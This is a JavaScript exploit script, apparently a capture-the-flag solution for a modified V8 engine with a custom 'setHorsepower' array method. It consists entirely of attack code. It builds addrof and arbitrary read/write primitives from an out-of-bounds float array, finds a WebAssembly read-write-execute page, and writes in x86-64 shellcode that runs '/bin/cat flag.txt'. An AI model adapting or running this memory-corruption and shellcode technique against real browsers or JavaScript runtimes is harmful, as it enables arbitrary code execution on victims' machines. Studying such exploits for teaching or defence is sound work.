function ftoi(val){
    f64[0]=val;
    return u64[0];
}

function itof(val){
    u64[0]=val;
    return f64[0];
}

function tohex(val){
    return val.toString(16);
}

function addrof(obj){
    obj_arr[0]=obj;
    float_arr[26]=itof(float_arr_map);
    let leak=ftoi(obj_arr[0])&0xffffffffn;
    float_arr[26]=itof(obj_arr_map);
    return leak;
}

function arb_read(addr){
    if(addr%2n==0){
        addr+=1n;
    }
    float_arr[2]=itof(((addr-0x8n)&0xffffffffn)+(0x100n<<32n));
    leak=ftoi(float_arr[0]);
    float_arr_0[6]=itof(float_arr_elements+(0x100n<<32n));
    return leak;
}

function initial_arb_write(addr,val){
    if(addr%2n==0){
        addr+=1n;
    }
    float_arr[2]=itof(((addr-0x8n)&0xffffffffn)+(0x100n<<32n));
    float_arr[0]=itof(val);
    float_arr[2]=itof(float_arr_elements+(0x100n<<32n));
}

function copy_shellcode(addr,shellcode){
    let buf=new ArrayBuffer(0x100);
    let dataview=new DataView(buf);
    let buf_addr=addrof(buf);
    let backing_store_addr=buf_addr+0x14n;
    initial_arb_write(backing_store_addr,addr);
    for(var i=0;i<shellcode.length;i++){
        dataview.setBigUint64(8*i,shellcode[i],true);
    }
}

var buf=new ArrayBuffer(8);
var f64=new Float64Array(buf);
var u64=new BigUint64Array(buf);
var float_arr_0=[1.01];
float_arr_0.setHorsepower(0x100);
var float_arr=[1.1];
float_arr.setHorsepower(0x100);
var float_arr_map=ftoi(float_arr[1])&0xffffffffn;
var float_arr_elements=ftoi(float_arr[2])&0xffffffffn;
var obj_arr_map=float_arr_map+0x50n;
var tmp={"A":1.1};
var obj_arr=[tmp,tmp];
var wasmCode=new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,41,11]);
var wasmModule=new WebAssembly.Module(wasmCode);
var wasmInstance=new WebAssembly.Instance(wasmModule);
var func=wasmInstance.exports.main;
var shellcode=[0x622fba4952d23148n,0x52417461632f6e69n,0x6c66ba4952e78948n,0x52417478742e6761n,0x8948575352e38948n,0x9090050f993bb0e6n];
var wasmInstance_addr=addrof(wasmInstance);
var rwx_base=arb_read(wasmInstance_addr+0x68n);
copy_shellcode(rwx_base,shellcode);
func();
